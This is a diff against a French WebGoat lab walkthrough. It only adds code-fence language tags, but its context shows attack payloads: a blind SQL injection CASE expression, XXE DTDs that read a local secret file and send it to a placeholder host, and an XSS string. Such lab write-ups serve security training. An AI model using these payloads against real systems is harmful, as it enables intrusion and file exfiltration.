@@ -193,7 +193,7 @@ Comme spécifié dans les indices, il est possible de changer le mot de passe à
 
 Ce challenge peut être un bon exercice pour s'entraîner au scripting. Ci-dessous, un petit exemple de code Python permettant de retrouver la réponse:
 
-```
+```python
 import json  
 import requests  
   
@@ -281,7 +281,7 @@ Les cases doivent contenir les mots suivants pour valider la leçon : `getConnec
 
 Compléter la fenêtre avec :
 
-```
+```java
 try {  
      Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);  
      PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");  
@@ -310,7 +310,7 @@ try {
     `column=(CASE WHEN (SELECT ip FROM whatever WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)`
 *   On tombe sur une page d'erreur, on a tout pour écrire le script maintenant.
   
-```
+```python
 import json  
 import requests  
   
@@ -580,13 +580,13 @@ jwt_tokens_8()
 6. Même si ce n'est pas un challenge, une petite erreur s'est glissée dans la leçon, faire attention à rentrer les bonnes URL pour pouvoir effectuer le test. 
   
 **attack.dtd**  
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>  
 <!ENTITY ping SYSTEM 'http://host:port/landing?test=HelloWorld' >
 ```  
   
 **Request Body**  
-```
+```xml
 <?xml version="1.0"?>  
 <!DOCTYPE root [  
 <!ENTITY % remote SYSTEM "http://host:port/files/username/attack.dtd" >  
@@ -611,13 +611,13 @@ jwt_tokens_8()
 *   Modifier le corps de la requête comme spécifié ci-dessous.
 
 **contents\_file.dtd**  
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>  
 <!ENTITY % all "<!ENTITY send SYSTEM 'http://host:port/landing?%file;' >" >%all;
 ```  
   
 **Request Body**  
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>  
 <!DOCTYPE xxe [  
 <!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt" >  
@@ -857,7 +857,7 @@ public class AntiSamyController {
 
 5. Copier-coller `Ok<script>XSS</script>` dans chaque case.
 
-12.  
+12.
 ![Warning](images/wiki_owasp_webgoat/warning.png)  Cette leçon ne semble pas fonctionner.
 
 Pour la désérialisation, suivre le lien http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/ pour comprendre comment cela fonctionne. Le _payload_ suivant devrait fonctionner, mais ce n'est pas le cas.
